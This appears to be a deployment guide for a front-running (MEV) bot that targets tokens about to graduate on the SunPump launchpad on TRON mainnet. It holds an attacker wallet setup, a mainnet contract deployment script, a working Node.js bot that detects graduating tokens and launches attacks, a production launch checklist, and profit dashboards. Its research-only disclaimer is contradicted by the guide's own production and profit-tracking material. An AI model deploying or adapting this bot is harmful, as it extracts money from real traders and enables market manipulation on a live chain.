# SunPump Graduation MEV PoC - Deployment & Testing Guide

## 1. Prerequisites

### 1.1 Environment Setup

```bash
# Install dependencies
npm install -g @tronweb3/tronweb ethers dotenv

# Clone or navigate to project
cd /path/to/security-research/hunts/sunpump/poc

# Create environment file
cat > .env << 'EOF'
# TRON Network
TRON_RPC_URL=https://api.trongrid.io
TRON_MAINNET_ID=0x2711c47c5bac44434c14ab9d0ae27490

# Attacker wallet
ATTACKER_PRIVATE_KEY=0x...your_private_key...
ATTACKER_ADDRESS=T...your_address...

# Attack parameters
SEED_CAPITAL_TRX=1000
MIN_PROFITABILITY_SCORE=80
MAX_ATTACKS_PER_DAY=10

# Notification settings
TELEGRAM_BOT_TOKEN=xxx
TELEGRAM_CHAT_ID=xxx
EOF

chmod 600 .env
```

### 1.2 Required Accounts & Capital

```
- TRON mainnet account with private key
- Minimum balance: 50 TRX (for gas fees + testing)
- For production: 1000-5000 TRX (seed capital pool)
- Hardware wallet recommended (Ledger/Trezor)
```

---

## 2. Solidity Contract Deployment

### 2.1 Compile Contract

```bash
# Using Hardhat
npx hardhat compile

# Or Truffle
truffle compile

# Or Remix IDE (easier for TRON)
# 1. Go to https://remix.tronprotocol.org
# 2. Paste GraduationMEVAttacker.sol
# 3. Compile with Solidity 0.8.0+
```

### 2.2 Deploy to TRON Mainnet

```javascript
// hardhat.config.js or deployment script
require('dotenv').config();
const { TronWeb } = require('tronweb');

const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: { 'TRON-PRO-API-KEY': 'your_api_key' }
});

async function deploy() {
    const privateKey = process.env.ATTACKER_PRIVATE_KEY;
    tronWeb.setPrivateKey(privateKey);

    // Compile contract ABI
    const contractABI = require('./artifacts/GraduationMEVAttacker.json').abi;
    const contractBytecode = require('./artifacts/GraduationMEVAttacker.json').bytecode;

    // Deploy
    const undeployedContract = await tronWeb.contract()
        .createInstance({
            abi: contractABI,
            bytecode: contractBytecode
        });

    const deploymentTx = await undeployedContract.deploy();
    console.log('Contract deployed at:', deploymentTx.address);
    
    return deploymentTx.address;
}

deploy().catch(console.error);
```

### 2.3 Contract Verification

```bash
# Verify on TronScan
# 1. Go to TronScan.org
# 2. Search contract address
# 3. Click "Verify Contract"
# 4. Upload GraduationMEVAttacker.sol
# 5. Select compiler version 0.8.0
# 6. Leave optimization on
```

---

## 3. Off-Chain Bot Implementation

### 3.1 Node.js Monitoring Bot

```javascript
// bot.js - Graduation MEV Bot
const TronWeb = require('tronweb');
require('dotenv').config();

const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY }
});

const SUNPUMP_PROXY = 'TTfvyrAz86hbZk5iDpKD78pqLGgi8C7AAw';
const ATTACKER_CONTRACT = process.env.ATTACKER_CONTRACT_ADDRESS;
const GRADUATION_THRESHOLD = 0.95;

// Load contract ABI
const contractABI = require('./artifacts/GraduationMEVAttacker.json').abi;

class GraduationMEVBot {
    constructor() {
        this.contract = tronWeb.contract(contractABI, ATTACKER_CONTRACT);
        this.opportunities = [];
        this.activeAttacks = {};
    }

    async monitorTokens() {
        console.log('[*] Starting mempool monitor...');

        setInterval(async () => {
            try {
                // Query all tokens from SunPump (via events)
                const events = await tronWeb.event()
                    .getEventByContractAddress(SUNPUMP_PROXY)
                    .sort(-1)
                    .limit(1000)
                    .get();

                for (const event of events) {
                    if (event.event === 'TokenCreated') {
                        const tokenAddress = event.result.token_address;
                        await this.evaluateToken(tokenAddress);
                    }
                }

            } catch (error) {
                console.error('[ERROR] Monitor error:', error.message);
            }
        }, 2000); // Check every 2 seconds
    }

    async evaluateToken(tokenAddress) {
        try {
            // Call contract evaluateToken function
            const result = await this.contract.evaluateToken(tokenAddress).call();
            const completionPct = result[0];
            const profitabilityScore = result[1];

            if (completionPct >= GRADUATION_THRESHOLD * 100) {
                console.log(`\n[!!!] GRADUATION ALERT:`);
                console.log(`      Token: ${tokenAddress}`);
                console.log(`      Completion: ${completionPct / 100}%`);
                console.log(`      Profitability: ${profitabilityScore}%`);

                if (profitabilityScore >= process.env.MIN_PROFITABILITY_SCORE) {
                    console.log(`[→] LAUNCHING ATTACK`);
                    await this.launchAttack(tokenAddress);
                }
            }
        } catch (error) {
            // Token may not be valid for evaluation
        }
    }

    async launchAttack(tokenAddress) {
        const seedCapital = process.env.SEED_CAPITAL_TRX * 1e6; // Convert to sun

        if (this.activeAttacks[tokenAddress]) {
            console.log('[!] Attack already active for this token');
            return;
        }

        this.activeAttacks[tokenAddress] = {
            startTime: Date.now(),
            stage: 'front-run'
        };

        try {
            // Execute full attack
            const tx = await this.contract.executeFullAttack(
                tokenAddress,
                seedCapital
            ).send({
                callValue: seedCapital,
                feeLimit: 500_000 * 10000 // 500k energy
            });

            console.log(`[✓] Attack submitted: ${tx}`);

            // Monitor transaction
            await this.monitorAttack(tx, tokenAddress);

        } catch (error) {
            console.error(`[✗] Attack failed:`, error.message);
            delete this.activeAttacks[tokenAddress];
        }
    }

    async monitorAttack(txHash, tokenAddress) {
        const maxRetries = 60;
        let retries = 0;

        const interval = setInterval(async () => {
            try {
                const txInfo = await tronWeb.trx.getTransaction(txHash);

                if (txInfo?.receipt?.result === 'SUCCESS') {
                    console.log(`[✓] Attack completed successfully!`);
                    
                    // Get profit
                    const totalProfit = await this.contract.getTotalProfit().call();
                    console.log(`[=] Total profit: ${totalProfit / 1e6} TRX`);

                    clearInterval(interval);
                    delete this.activeAttacks[tokenAddress];

                    // Notify
                    await this.notifySuccess(tokenAddress, totalProfit);

                } else if (txInfo?.receipt?.result === 'FAILED') {
                    console.log(`[✗] Attack failed!`);
                    clearInterval(interval);
                    delete this.activeAttacks[tokenAddress];
                }

                retries++;
                if (retries > maxRetries) {
                    console.log(`[!] Transaction timeout`);
                    clearInterval(interval);
                }

            } catch (error) {
                console.error('[ERROR] Monitor error:', error.message);
            }
        }, 2000);
    }

    async notifySuccess(tokenAddress, profit) {
        // Send Telegram notification
        const message = `
🎯 **SunPump Graduation MEV Attack Successful**

Token: ${tokenAddress}
Profit: ${profit / 1e6} TRX
Time: ${new Date().toISOString()}

Explorer: https://tronscan.org/#/address/${ATTACKER_CONTRACT}
        `;

        if (process.env.TELEGRAM_BOT_TOKEN) {
            const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: process.env.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.error('Telegram notification failed:', error);
            }
        }
    }
}

// Start bot
const bot = new GraduationMEVBot();
bot.monitorTokens();
```

### 3.2 Python Alternative

```python
# bot.py - Python implementation
import asyncio
import json
import os
from tronpy import Tron
from tronpy.keys import PrivateKey
from dotenv import load_dotenv
from datetime import datetime

load_dotenv()

class GraduationMEVBot:
    def __init__(self):
        self.client = Tron(provider='https://api.trongrid.io')
        self.account = PrivateKey(bytes.fromhex(os.getenv('ATTACKER_PRIVATE_KEY')))
        self.contract_address = os.getenv('ATTACKER_CONTRACT_ADDRESS')
        
    async def monitor_loop(self):
        print("[*] Starting bot...")
        
        while True:
            try:
                # Fetch recent graduations
                graduations = await self.fetch_graduations()
                
                for graduation in graduations:
                    token = graduation['token']
                    completion = graduation['completion']
                    
                    if completion >= 95:
                        await self.evaluate_and_attack(token)
                
                await asyncio.sleep(2)
                
            except Exception as e:
                print(f"[ERROR] {e}")
                await asyncio.sleep(5)
    
    async def fetch_graduations(self):
        # Query blockchain for graduation events
        # Implementation depends on TronPy library capabilities
        pass
    
    async def evaluate_and_attack(self, token):
        # Call contract to evaluate profitability
        pass

# Run
if __name__ == "__main__":
    bot = GraduationMEVBot()
    asyncio.run(bot.monitor_loop())
```

---

## 4. Testing Strategy

### 4.1 Unit Tests

```javascript
// test/GraduationMEVAttacker.test.js
const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('GraduationMEVAttacker', () => {
    let attacker;
    let owner;

    beforeEach(async () => {
        [owner] = await ethers.getSigners();
        const GraduationMEVAttacker = await ethers.getContractFactory('GraduationMEVAttacker');
        attacker = await GraduationMEVAttacker.deploy();
        await attacker.deployed();
    });

    describe('Token Evaluation', () => {
        it('should correctly evaluate token completion', async () => {
            const tokenAddress = '0x...'; // Test token
            const [completion, profitability] = await attacker.evaluateToken(tokenAddress);
            
            expect(completion).to.be.within(0, 100);
            expect(profitability).to.be.within(0, 100);
        });

        it('should identify attack candidates', async () => {
            const tokenAddress = '0x...';
            const isCandidate = await attacker.isAttackCandidate(tokenAddress);
            
            expect(typeof isCandidate).to.equal('boolean');
        });
    });

    describe('Attack Execution', () => {
        it('should execute front-run', async () => {
            const tokenAddress = '0x...';
            const trxAmount = ethers.utils.parseEther('100');
            
            const tx = await attacker.executeFrontRun(tokenAddress, trxAmount, {
                value: trxAmount
            });
            
            expect(tx).to.emit(attacker, 'FrontRunExecuted');
        });

        it('should estimate profit correctly', async () => {
            const tokenAddress = '0x...';
            const trxAmount = ethers.utils.parseEther('100');
            
            const [profit, percentage] = await attacker.estimateProfit(tokenAddress, trxAmount);
            
            expect(profit).to.be.gte(0);
            expect(percentage).to.be.within(0, 1000);
        });
    });

    describe('Admin Functions', () => {
        it('should allow owner to withdraw', async () => {
            const initialBalance = await ethers.provider.getBalance(owner.address);
            
            // Deposit
            await owner.sendTransaction({
                to: attacker.address,
                value: ethers.utils.parseEther('10')
            });
            
            // Withdraw
            await attacker.withdraw();
            
            const finalBalance = await ethers.provider.getBalance(owner.address);
            expect(finalBalance).to.be.gt(initialBalance);
        });

        it('should only allow owner to pause', async () => {
            await attacker.setPaused(true);
            expect(await attacker.paused()).to.equal(true);
        });
    });
});
```

### 4.2 Integration Tests

```bash
#!/bin/bash
# test/integration_test.sh

echo "[*] Running integration tests..."

# Test 1: Deploy contract
echo "[1] Deploying contract..."
DEPLOY_OUTPUT=$(npm run deploy 2>&1)
CONTRACT_ADDRESS=$(echo $DEPLOY_OUTPUT | grep -oP 'deployed at: \K0x[a-f0-9]*')
echo "    Contract: $CONTRACT_ADDRESS"

# Test 2: Evaluate a real token
echo "[2] Evaluating token..."
EVAL=$(npm run eval -- $CONTRACT_ADDRESS TXxxxxxxxxxxxxxxxx)
echo "    Result: $EVAL"

# Test 3: Estimate profit
echo "[3] Estimating profit..."
PROFIT=$(npm run estimate -- $CONTRACT_ADDRESS TXxxxxxxxxxxxxxxxx 1000)
echo "    Estimated: $PROFIT TRX"

# Test 4: Run bot for 5 minutes
echo "[4] Running bot test (5 min)..."
timeout 300 npm run bot 2>&1 | tee bot_test.log

# Test 5: Check bot logs
ATTACKS=$(grep -c "LAUNCHING ATTACK" bot_test.log)
echo "    Attacks detected: $ATTACKS"

echo "[✓] Integration tests complete"
```

---

## 5. Production Deployment Checklist

### 5.1 Pre-Launch

```
□ Contract audited by security firm (CertiK/Trail of Bits)
□ Private key stored in hardware wallet
□ Contract deployed and verified on TronScan
□ Test bot run for 24 hours without incidents
□ Profit monitoring dashboard active
□ Telegram alerts configured
□ Backup RPC endpoints configured
□ Rate limiting on API calls set
□ Emergency shutdown procedure documented
```

### 5.2 Launch Monitoring

```bash
#!/bin/bash
# scripts/monitor.sh

echo "[*] Monitoring bot performance..."

while true; do
    # Check bot process
    if ! pgrep -f "node bot.js" > /dev/null; then
        echo "[!] Bot process died, restarting..."
        npm run bot &
    fi

    # Check contract balance
    BALANCE=$(npm run balance)
    echo "[$(date)] Balance: $BALANCE TRX"

    # Check attack count
    ATTACKS=$(npm run attacks)
    echo "[$(date)] Total attacks: $ATTACKS"

    sleep 60
done
```

---

## 6. Risk Management

### 6.1 Safety Limits

```javascript
// Hard limits in contract
const MAX_SEED_CAPITAL = 5000 * 1e6;      // 5000 TRX max per attack
const MAX_SLIPPAGE = 15;                   // 15% max slippage
const MIN_PROFITABILITY = 80;              // 80% score minimum
const MAX_ENERGY_PER_TX = 500_000;         // 500k energy limit
```

### 6.2 Circuit Breaker

```javascript
// Auto-pause on unexpected conditions
if (profitLoss > 1000 * 1e6) {  // Loss > 1000 TRX
    await contract.setPaused(true);
    console.error("CIRCUIT BREAKER: Pausing contract");
}
```

---

## 7. Analysis & Metrics

### 7.1 Performance Dashboard

```javascript
// scripts/dashboard.js
const metrics = {
    totalAttacks: 0,
    successfulAttacks: 0,
    failedAttacks: 0,
    totalProfit: 0,
    totalLoss: 0,
    avgProfit: 0,
    winRate: 0,
    roi: 0
};

async function updateMetrics() {
    const attacks = await contract.getSuccessfulAttacks(1000);
    
    metrics.totalAttacks = attacks.length;
    metrics.successfulAttacks = attacks.filter(a => a.success).length;
    metrics.totalProfit = attacks.reduce((sum, a) => sum + a.profit, 0);
    metrics.winRate = (metrics.successfulAttacks / metrics.totalAttacks) * 100;
    metrics.roi = (metrics.totalProfit / totalSeedCapital) * 100;
    
    console.table(metrics);
}
```

---

## 8. Legal Disclaimer

This PoC is provided for **educational and security research purposes only**.

**WARNING:**
- Unauthorized trading/MEV attacks may violate:
  - Securities laws (market manipulation)
  - Computer fraud statutes
  - Exchange terms of service
  - Smart contract intended use restrictions

**Use Only For:**
- Security research with written permission
- Private testnet environments
- Bug bounty programs
- Academic study

**Not For:**
- Live production attacks
- Unauthorized profit extraction
- Circumventing security controls

---

## 9. References

- Solidity Docs: https://docs.soliditylang.org/
- TronWeb: https://github.com/tronprotocol/tronweb
- SunPump Contracts: https://github.com/sunprotocol/
- MEV Research: https://ethereum.org/en/developers/docs/mev/

---

**End of Deployment Guide**
